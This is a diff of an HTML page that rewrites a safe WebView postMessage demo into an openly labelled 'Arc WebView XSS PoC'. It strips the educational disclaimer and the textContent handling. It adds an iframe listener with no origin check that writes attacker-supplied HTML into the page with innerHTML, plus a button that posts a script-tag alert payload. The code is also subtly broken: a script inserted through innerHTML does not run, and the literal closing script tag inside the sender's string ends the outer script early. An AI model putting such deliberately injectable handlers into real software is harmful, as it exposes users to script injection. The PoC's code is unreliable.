@@ -2,86 +2,33 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>⚠️ WebView Security Demonstration</title>
+  <title>🔥 Arc WebView XSS PoC – Unified</title>
   <style>
-    body { 
-      background: #f5f5f5; 
-      color: #333; 
-      font-family: 'Consolas', monospace; 
-      padding: 1rem; 
-      max-width: 800px;
-      margin: 0 auto;
-    }
-    .disclaimer {
-      background-color: #fff8e1;
-      border-left: 4px solid #ffc107;
-      padding: 15px;
-      margin-bottom: 20px;
-    }
-    iframe { 
-      width: 100%; 
-      height: 300px; 
-      border: 1px solid #ddd; 
-      margin-top: 1rem; 
-      background: white;
-    }
-    button { 
-      padding: 0.5rem 1rem; 
-      background: #4CAF50; 
-      border: none; 
-      color: white; 
-      font-weight: bold; 
-      cursor: pointer; 
-      border-radius: 4px;
-    }
-    #log { 
-      margin-top: 1rem; 
-      background: white;
-      padding: 1rem;
-      border: 1px solid #ddd;
-      font-size: 0.9rem; 
-      white-space: pre-wrap; 
-    }
+    body { background: #111; color: #0f0; font-family: monospace; padding: 1rem; }
+    iframe { width: 100%; height: 300px; border: 2px solid lime; margin-top: 1rem; }
+    button { padding: 0.5rem 1rem; background: lime; border: none; color: #000; font-weight: bold; cursor: pointer; }
+    #log { margin-top: 1rem; color: #ccc; font-size: 0.9rem; white-space: pre-wrap; }
   </style>
 </head>
 <body>
 
-<div class="disclaimer">
-  <h3>⚠️ Security Research Demonstration</h3>
-  <p>This is a <strong>safe simulation</strong> for educational purposes only. Never test security vulnerabilities without explicit permission.</p>
-</div>
-
-<h2>🔍 WebView postMessage Handling Demo</h2>
-<p>Click the button to send a test message to the simulated WebView:</p>
-<button onclick="sendDemoMessage()">📤 Send Test Message</button>
+<h2>🚀 Arc WebView XSS PoC (All-in-One)</h2>
+<p>Click the button to send an XSS payload to the simulated WebView below:</p>
+<button onclick="sendXSS()">💥 Send Payload</button>
 
 <iframe id="webview" srcdoc='
   <!DOCTYPE html>
   <html>
-  <head>
-    <style>
-      body { font-family: Arial; padding: 1rem; }
-      #output { 
-        padding: 1rem;
-        margin-top: 1rem;
-        background: #f9f9f9;
-        border: 1px dashed #ccc;
-      }
-    </style>
-  </head>
-  <body>
-    <h3>WebView Simulation</h3>
+  <body style="background:black;color:lime;font-family:monospace;padding:1rem;">
+    <h3>🧪 WebView Simulation Active</h3>
     <div id="output">[waiting for message...]</div>
     <script>
       window.addEventListener("message", (e) => {
-        const output = document.getElementById("output");
-        console.log("Message received:", e.data);
-        
-        // Secure alternative: Use textContent instead of innerHTML
-        if (e.data?.demoContent) {
-          output.textContent = "Received: " + e.data.demoContent;
-        } else {
-          output.textContent = "[Invalid message format]";
+        console.log("📩 Message received:", e.data);
+        if (e.data?.props?.dangerouslySetInnerHTML?.__html) {
+          const html = e.data.props.dangerouslySetInnerHTML.__html;
+          document.getElementById("output").innerHTML = html;
+          console.log("⚠️ Injected into DOM:", html);
         }
       });
     </script>
@@ -89,24 +36,20 @@
   </html>
 '></iframe>
 
-<div id="log">[Event log will appear here]</div>
+<div id="log"></div>
 
 <script>
-function sendDemoMessage() {
+function sendXSS() {
   const payload = {
-    demoContent: "This is a safe text demonstration (in a real vulnerability, this might be processed as HTML)"
+    props: {
+      dangerouslySetInnerHTML: {
+        __html: `<script>alert('🔥 XSS confirmed')</script>`
+      }
+    }
   };
-  
   const iframe = document.getElementById("webview");
-  try {
-    iframe.contentWindow.postMessage(payload, "*");
-    document.getElementById("log").textContent = 
-      "📤 Message sent:\n" + 
-      JSON.stringify(payload, null, 2) +
-      "\n\nNote: This demonstrates how messages are received. In vulnerable systems, improper handling could lead to security issues.";
-  } catch (e) {
-    document.getElementById("log").textContent = "Error: " + e.message;
-  }
+  iframe.contentWindow.postMessage(payload, "*");
+  document.getElementById("log").innerText = "🚀 Payload sent via postMessage:\n" + JSON.stringify(payload, null, 2);
 }
 </script>
 
